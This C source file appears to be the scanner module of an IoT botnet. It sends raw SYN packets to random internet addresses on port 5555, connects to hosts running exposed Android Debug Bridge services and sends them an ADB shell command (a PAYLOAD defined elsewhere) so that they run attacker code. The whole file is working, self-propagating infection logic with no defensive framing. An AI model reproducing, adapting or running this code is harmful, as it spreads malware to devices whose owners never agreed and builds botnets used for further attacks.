#if SCAN
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdint.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <string.h>

#include "main.h"
#include "rand.h"
#include "scan.h"
//#include "resolve.h"
#include "checksum.h"

int scan_pid = 0;

void terminate_scan(void)
{
	if(scan_pid != 0)
	{
		kill(scan_pid, SIGKILL);
	}
	return;
}

static uint32_t generate_random_ipv4(void)
{
    uint8_t buf[4] = {0};

    do
    {
        buf[0] = rand_new() % 0xff;
        buf[1] = rand_new() % 0xff;
        buf[2] = rand_new() % 0xff;
        buf[3] = rand_new() % 0xff;
    }
    while
    (
        buf[0] == 127 || buf[0] == 0 || (buf[0] == 192 && buf[1] == 168)
    );

    return INET_ADDR(buf[0],buf[1],buf[2],buf[3]);
}

static void reset_state(struct scan *ptr)
{
    close(ptr->fd);
    ptr->fd = -1;
    ptr->state = SCAN_CLOSED;
    ptr->timeout = 0;
}

static void establish_connection(struct scan *ptr)
{
    struct sockaddr_in addr;

    if((ptr->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;

    addr.sin_family = AF_INET;
    addr.sin_port = ptr->port;
    addr.sin_addr.s_addr = ptr->addr;

    NONBLOCK(ptr->fd);

    ptr->state = SCAN_CONNECTING;
    connect(ptr->fd, (struct sockaddr *)&addr, sizeof(addr));
    return;
}

static void check_timeout(struct scan *ptr, uint16_t timeout)
{
    int end_time = time(NULL);
    int cur_time = ptr->timeout;
    char ret = cur_time + timeout < end_time ? TRUE : FALSE;

    if(ret)
    {
    	//DEBUG_PRINT("Scan timeout %d.%d.%d.%d (%d seconds)\n", ptr->addr & 0xff, (ptr->addr >> 8) & 0xff, (ptr->addr >> 16) & 0xff, (ptr->addr >> 24) & 0xff, timeout);
    	reset_state(ptr);
    }

    return;
}

static uint32_t calculate_sum(char *data, int data_len)
{
    uint32_t sum = 0;
    int count = 0;

    count = data_len;

    while(count-- > 0)
    {
        sum += *data++;
    }

    return sum;
}

static void adb_send_data(struct scan *ptr, char *cmd)
{
    uint32_t sum = 0;
    uint32_t size = strlen(cmd);
    uint32_t length = size + 1;
    uint8_t buf[12 + sizeof(uint32_t) * 2 + 4 + size + 1];

    sum = calculate_sum(cmd, size);

    memcpy(buf, "OPEN\x58\x01\x00\x00\x00\x00\x00\x00", 12);
    memcpy(buf + 12, &length, sizeof(uint32_t));
    memcpy(buf + 12 + sizeof(uint32_t), &sum, sizeof(uint32_t));
    memcpy(buf + 12 + sizeof(uint32_t) * 2, "\xb0\xaf\xba\xb1", 4);
    memcpy(buf + 12 + sizeof(uint32_t) * 2 + 4, cmd, size);
    memcpy(buf + 12 + sizeof(uint32_t) * 2 + 4 + size, "\x00", 1);

    if(send(ptr->fd, buf, sizeof(buf), MSG_NOSIGNAL) == -1)
    {
    	DEBUG_PRINT("Failed to sent the ADB data %d.%d.%d.%d:%d\n", ptr->addr & 0xff, (ptr->addr >> 8) & 0xff, (ptr->addr >> 16) & 0xff, (ptr->addr >> 24) & 0xff, ntohs(ptr->port));
        return;
    }

    DEBUG_PRINT("Successfully sent the ADB data %d.%d.%d.%d:%d!\n", ptr->addr & 0xff, (ptr->addr >> 8) & 0xff, (ptr->addr >> 16) & 0xff, (ptr->addr >> 24) & 0xff, ntohs(ptr->port));

    return;
}

void init_scan(void)
{
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    struct scan *fds;
    int i = 0;
    int fd = -1;
    char buf[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
    uint16_t port = htons(5555);
    uint16_t source_port = 0;

    scan_pid = fork();
    if(scan_pid > 0 || scan_pid == -1)
        return;

    LOCAL_ADDRESS = local_addr();

    init_rand();

    source_port = rand_new() & 0xffff;

    fds = (struct scan *)calloc(MAX_FDS, sizeof(struct scan));
    for(i = 0; i < MAX_FDS; i++)
    {
        reset_state(&fds[i]);
    }

    if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        DEBUG_PRINT("Failed to initalize a scan\n");
        exit(1);
    }

    NONBLOCK(fd);
    
    i = 1;
    if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        close(fd);
        exit(1);
    }

    ip_header = (struct iphdr *)buf;
    tcp_header = (struct tcphdr *)(ip_header + 1);

    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip_header->id = rand_new() & 0xffff;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_TCP;

    tcp_header->dest = port;
    tcp_header->source = source_port;
    tcp_header->doff = 5;
    tcp_header->window = rand_new() & 0xffff;
    // Set the flag respectively
    tcp_header->ack = FALSE;
    tcp_header->fin = FALSE;
    tcp_header->urg = FALSE;
    tcp_header->psh = FALSE;
    tcp_header->rst = FALSE;
    tcp_header->syn = TRUE;

    DEBUG_PRINT("Scan initialized!\n");

    while(TRUE)
    {
        fd_set write_set;
        struct timeval timeout;
        int num_fds = 0;
        int max_fds = 0;

        for(i = 0; i < MAX_RAW_PPS; i++)
        {
            struct iphdr *ip_header;
            struct tcphdr *tcp_header;
            struct sockaddr_in addr = {0};

            ip_header = (struct iphdr *)buf;
            tcp_header = (struct tcphdr *)(ip_header + 1);

            // Update the IP header
            ip_header->id = rand_new() & 0xffff;
            ip_header->saddr = LOCAL_ADDRESS;
            ip_header->daddr = generate_random_ipv4();

            ip_header->check = 0;
            ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

            tcp_header->dest = port;
            tcp_header->seq = ip_header->daddr;
            tcp_header->check = 0;
            tcp_header->check = tcp_udp_header_checksum(ip_header, tcp_header, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

            addr.sin_family = AF_INET;
            addr.sin_port = tcp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr;

            sendto(fd, buf, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }

        while(TRUE)
        {
            int ret = 0;
            char datagram[1514];
            struct iphdr *ip_header;
            struct tcphdr *tcp_header;

            ip_header = (struct iphdr *)datagram;
            tcp_header = (struct tcphdr *)(ip_header + 1);
        
            errno = 0;
            ret = recvfrom(fd, datagram, sizeof(datagram), MSG_NOSIGNAL, NULL, NULL);
            if(ret <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if(ret < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if(!tcp_header->syn)
                continue;
            if(!tcp_header->ack)
                continue;
            if(tcp_header->rst)
                continue;
            if(tcp_header->fin)
                continue;
            if(tcp_header->source != tcp_header->source)
                continue;
            if(tcp_header->dest != source_port)
                continue;
            if(ip_header->protocol != IPPROTO_TCP)
                continue;

            // Check if we have space to load
            for(ret = 0; ret < MAX_FDS; ret++)
            {
                if(fds[ret].fd == -1 && fds[ret].state == SCAN_CLOSED)
                    break;
            }

            // Failed to slot anything
            if(ret == MAX_FDS)
                continue;

            fds[ret].addr = ip_header->saddr;
            fds[ret].port = tcp_header->source;
            establish_connection(&fds[ret]);
            fds[ret].timeout = time(NULL);
            //memset(fds[ret].buf, 0, 1024);

            DEBUG_PRINT("Got SYN+ACK %d.%d.%d.%d:%d\n", fds[ret].addr & 0xff, (fds[ret].addr >> 8) & 0xff, (fds[ret].addr >> 16) & 0xff, (fds[ret].addr >> 24) & 0xff, ntohs(fds[ret].port));
        }

        FD_ZERO(&write_set);

        for(i = 0; i < MAX_FDS; i++)
        {
            if(fds[i].fd == -1 && fds[i].state == SCAN_CLOSED)
                continue;
            if(fds[i].state == SCAN_CONNECTING)
            {
                FD_SET(fds[i].fd, &write_set);
                if(fds[i].fd > max_fds)
                    max_fds = fds[i].fd;
            }
        }

        timeout.tv_usec = 0;
        timeout.tv_sec = 1;
        num_fds = select(max_fds + 1, NULL, &write_set, NULL, &timeout);

        for(i = 0; i < MAX_FDS; i++)
        {
            if(fds[i].fd == -1 && fds[i].state == SCAN_CLOSED)
                continue;
            if(FD_ISSET(fds[i].fd, &write_set))
            {
                int err = 0;
                socklen_t err_len = sizeof(err);
                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    DEBUG_PRINT("Failed to establish a connection to %d.%d.%d.%d:%d\n", fds[i].addr & 0xff, (fds[i].addr >> 8) & 0xff, (fds[i].addr >> 16) & 0xff, (fds[i].addr >> 24) & 0xff, ntohs(fds[i].port));
                    reset_state(&fds[i]);
                    continue;
                }
                DEBUG_PRINT("Established a connection to %d.%d.%d.%d:%d\n", fds[i].addr & 0xff, (fds[i].addr >> 8) & 0xff, (fds[i].addr >> 16) & 0xff, (fds[i].addr >> 24) & 0xff, ntohs(fds[i].port));
                fds[i].state = SCAN_OPEN;
                send(fds[i].fd, CNXN, CNXN_SIZE, MSG_NOSIGNAL);
                adb_send_data(&fds[i], PAYLOAD);
                fds[i].timeout = time(NULL);
            }
        }

        for(i = 0; i < MAX_FDS; i++)
        {
            if(fds[i].fd == -1 && fds[i].state == SCAN_CLOSED)
                continue;
            if(fds[i].timeout + SCAN_TIMEOUT < time(NULL))
            {
                DEBUG_PRINT("Connection timed out to %d.%d.%d.%d:%d!\n", fds[i].addr & 0xff, (fds[i].addr >> 8) & 0xff, (fds[i].addr >> 16) & 0xff, (fds[i].addr >> 24) & 0xff, ntohs(fds[i].port));
                reset_state(&fds[i]);
            }
        }
    }
}
#endif

